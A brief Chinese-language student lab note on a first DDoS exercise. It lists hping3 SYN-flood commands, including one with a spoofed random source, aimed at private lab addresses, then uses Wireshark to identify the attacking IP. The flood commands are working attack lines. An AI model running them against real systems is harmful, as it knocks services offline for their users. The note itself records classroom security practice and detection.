
### 這是我第一次的DDos實作😃

#### 上課教了︰
<code>hping3 -V  -c 100000 -d 100 -S -p 21 --flood 192.168.43.129</code><br/>
<code>hping3 -V  -c 100000 -d 100 -S -p 21 --flood --rand-source 192.168.43.129</code>

#### 自主學習︰
##### 問題1  用wireshark監測攻擊方ip
使用指令(hping3 -V  -c 100000 -d 100 -S -p 21 --flood 192.168.19.130)攻擊
可以看到攻擊來源都是來自192.168.19.128 的ip位置。




